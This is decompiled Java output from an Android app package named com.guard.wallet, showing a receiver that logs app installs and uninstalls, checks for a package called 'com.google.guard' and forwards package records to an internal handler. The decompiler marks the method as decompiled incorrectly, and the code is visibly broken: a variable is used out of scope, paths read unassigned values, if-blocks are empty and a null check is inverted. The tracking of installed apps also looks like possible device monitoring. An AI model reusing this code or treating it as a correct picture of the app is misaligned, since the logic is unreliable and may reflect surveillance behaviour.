package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.AppInfo;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Objects;
import com.guard.wallet.entity.BuildConfig;

/* loaded from: classes.dex */
public class PackageReceiver extends BroadcastReceiver {

    /* renamed from: a */
    public Integer f281a = 0;

    /* JADX WARN: Removed duplicated region for block: B:18:0x0060  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x00ae A[Catch: Exception -> 0x00c9, TRY_LEAVE, TryCatch #0 {Exception -> 0x00c9, blocks: (B:3:0x0009, B:5:0x0011, B:7:0x001b, B:9:0x002c, B:10:0x0034, B:21:0x00ae, B:26:0x0064, B:28:0x008b, B:30:0x0096, B:31:0x0047, B:34:0x0051), top: B:2:0x0009 }] */
    /* JADX WARN: Removed duplicated region for block: B:25:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0096 A[Catch: Exception -> 0x00c9, TryCatch #0 {Exception -> 0x00c9, blocks: (B:3:0x0009, B:5:0x0011, B:7:0x001b, B:9:0x002c, B:10:0x0034, B:21:0x00ae, B:26:0x0064, B:28:0x008b, B:30:0x0096, B:31:0x0047, B:34:0x0051), top: B:2:0x0009 }] */
    @Override // android.content.BroadcastReceiver
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onReceive(Context context, Intent intent) {
        char c;
        AppInfo d02;
        try {
            this.f281a = 1;
        } catch (Exception e2) {
            AbstractC0026q.m186s("PackageReceiver", e2);
        }
        if (intent == null || AbstractC0026q.m151B(intent.getAction())) {
            return;
        }
        Log.d("PackageReceiver", intent.getAction());
        String dataString = intent.getDataString();
        if (!AbstractC0026q.m151B(dataString)) {
            dataString = dataString.replaceAll("package:", BuildConfig.FLAVOR);
        }
        String action = intent.getAction();
        int hashCode = action.hashCode();
        if (hashCode != 525384130) {
            if (hashCode == 1544582882 && action.equals("android.intent.action.PACKAGE_ADDED")) {
                c = 0;
                if (c != 0) {
                    Log.d("PackageReceiver", "安装了:" + dataString + "包名的程序");
                    d02 = AbstractC0251g.d0(dataString);
                } else if (c != 1) {
                    d02 = null;
                } else {
                    Log.d("PackageReceiver", "卸载了:" + dataString + "包名的程序");
                    AppInfo appInfo = new AppInfo();
                    appInfo.setPackageName(dataString);
                    appInfo.setUninstalled(1);
                    if (Objects.equals(dataString, "com.google.guard")) {
                        AbstractC0252h.m719w("powerControlState:".concat("com.google.guard"));
                    }
                    d02 = appInfo;
                }
                if (d02 == null) {
                    MessageRecordVO messageRecordVO = new MessageRecordVO();
                    messageRecordVO.setIntentCode(intent.getAction());
                    messageRecordVO.setExtraBody(d02);
                    MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
                    return;
                }
                return;
            }
            c = 65535;
            if (c != 0) {
            }
            if (d02 == null) {
            }
        } else {
            if (action.equals("android.intent.action.PACKAGE_REMOVED")) {
                c = 1;
                if (c != 0) {
                }
                if (d02 == null) {
                }
            }
            c = 65535;
            if (c != 0) {
            }
            if (d02 == null) {
            }
        }
        AbstractC0026q.m186s("PackageReceiver", e2);
    }
}
